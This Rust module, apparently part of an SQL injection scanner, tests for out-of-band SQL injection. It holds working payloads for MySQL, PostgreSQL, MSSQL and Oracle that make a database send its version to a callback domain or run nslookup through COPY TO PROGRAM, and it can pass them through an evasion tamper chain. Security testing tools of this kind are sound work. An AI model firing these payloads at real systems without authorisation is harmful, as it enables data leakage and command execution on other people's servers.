//! Out-of-band (DNS/HTTP callback) SQL injection technique.

use std::time::Duration;
use tracing::{debug, info, warn};

use crate::sqx::{
    detector::SqliDetector,
    evasion::tamper_chain::TamperChain,
    models::{SqliTestResult, SqliTechnique},
};

impl SqliDetector {
    /// Test for Out-of-Band SQL injection using OOB server callbacks.
    /// Requires OOB server to be set via `with_oob_server()`.
    pub(crate) async fn test_out_of_band(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        tamper: Option<&TamperChain>,
    ) -> Option<SqliTestResult> {
        debug!("Testing Out-of-Band SQL injection on parameter: {}", param);

        let oob_server = match &self.oob_server {
            Some(server) => server,
            None => {
                debug!("OOB server not available, skipping OOB detection");
                return None;
            }
        };

        if !oob_server.is_running().await {
            debug!("OOB server not running, skipping OOB detection");
            return None;
        }

        let oob_id = oob_server
            .generate_id(Some(format!("SQLi OOB test for {}", param)))
            .await;
        let oob_domain = &oob_id.full_domain;

        info!("Starting OOB SQLi test with ID: {}", oob_domain);

        let oob_payloads = [
            (
                format!(
                    "{}' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.{}\\\\a.txt'))-- ",
                    original_value, oob_domain
                ),
                "MySQL",
            ),
            (
                format!(
                    "{}'; COPY (SELECT version()) TO PROGRAM 'nslookup {}'-- ",
                    original_value, oob_domain
                ),
                "PostgreSQL",
            ),
            (
                format!(
                    "{}; EXEC master..xp_dirtree '\\\\{}\\\\share'-- ",
                    original_value, oob_domain
                ),
                "MSSQL",
            ),
            (
                format!(
                    "{}' AND UTL_HTTP.request('http://{}/') IS NOT NULL-- ",
                    original_value, oob_domain
                ),
                "Oracle",
            ),
        ];

        for (payload, dbms) in &oob_payloads {
            let effective = tamper.map(|t| t.apply(payload)).unwrap_or_else(|| payload.clone());
            let test_url = self.build_test_url(url, param, original_value, &effective);
            match self.send_request(&test_url).await {
                Ok(_) => debug!("OOB payload sent for {} (domain: {})", dbms, oob_domain),
                Err(e) => debug!("OOB payload failed for {}: {}", dbms, e),
            }
            tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
        }

        info!("Polling for OOB callbacks on {}...", oob_domain);
        match oob_server.poll_for_interaction(&oob_id.id, 10).await {
            Ok(Some(interactions)) => {
                info!(
                    "OOB callback received! {} interactions detected.",
                    interactions.len()
                );
                let first = &interactions[0];

                // DBMS detection using more robust pattern matching on interaction data
                // Check both the interaction data and the payload source that triggered it
                let data_str = first.data.as_deref().unwrap_or("");
                let dbms_hint = detect_dbms_from_oob(data_str, &oob_payloads);

                let evidence = format!(
                    "OOB callback received from {} via {} at {} (data: {})",
                    first.source_ip,
                    first.interaction_type,
                    first.timestamp,
                    if data_str.len() > 200 { &data_str[..200] } else { data_str }
                );

                Some(SqliTestResult {
                    parameter: param.to_string(),
                    technique: SqliTechnique::OutOfBand,
                    confidence: 0.98,
                    payload: format!("OOB payload with domain {}", oob_domain),
                    evidence,
                    dbms_hint,
                })
            }
            Ok(None) => {
                debug!("No OOB callback received within timeout");
                None
            }
            Err(e) => {
                warn!("Error polling for OOB interaction: {}", e);
                None
            }
        }
    }
}

/// Detect DBMS from OOB interaction data using structured pattern matching.
fn detect_dbms_from_oob(data: &str, _payloads: &[(String, &str)]) -> Option<String> {
    // Score each DBMS based on data content
    let dbms_patterns: [(&str, &[&str]); 4] = [
        ("MySQL", &["MySQL", "mysql", "MariaDB", "my.cnf", "LOAD_FILE"]),
        ("PostgreSQL", &["PostgreSQL", "postgres", "pg_", "COPY"]),
        ("Microsoft SQL Server", &["SQL Server", "MSSQL", "xp_", "WAITFOR"]),
        ("Oracle", &["Oracle", "ORA-", "DBMS_", "UTL_", "TNS"]),
    ];

    let mut scores: Vec<(&str, u32)> = dbms_patterns.iter()
        .map(|(name, _)| (*name, 0u32))
        .collect();

    for (dbms, patterns) in &dbms_patterns {
        for pattern in *patterns {
            if data.contains(pattern)
                && let Some((_, score)) = scores.iter_mut().find(|(name, _)| name == dbms) {
                    *score += 1;
                }
        }
    }

    // Also check which payloads were sent (they contain DBMS-specific SQL)
    for (payload, dbms) in _payloads {
        let _ = payload; // Reference to avoid unused warning
        // Check if payload's DBMS-specific SQL fragments appear in data
        match *dbms {
            "MySQL" if data.contains("@@version") || data.contains("LOAD_FILE") => {
                if let Some((_, score)) = scores.iter_mut().find(|(name, _)| name == &"MySQL") {
                    *score += 2;
                }
            }
            "PostgreSQL" if data.contains("COPY") || data.contains("pg_") => {
                if let Some((_, score)) = scores.iter_mut().find(|(name, _)| name == &"PostgreSQL") {
                    *score += 2;
                }
            }
            "MSSQL" if data.contains("xp_") || data.contains("WAITFOR") => {
                if let Some((_, score)) = scores.iter_mut().find(|(name, _)| name == &"Microsoft SQL Server") {
                    *score += 2;
                }
            }
            "Oracle" if data.contains("UTL_") || data.contains("DBMS_") => {
                if let Some((_, score)) = scores.iter_mut().find(|(name, _)| name == &"Oracle") {
                    *score += 2;
                }
            }
            _ => {}
        }
    }

    // Return the highest scoring DBMS, or "Unknown" if no matches
    scores.into_iter()
        .max_by_key(|&(_, score)| score)
        .filter(|&(_, score)| score > 0)
        .map(|(name, _)| name.to_string())
        .or_else(|| Some("Unknown".to_string()))
}
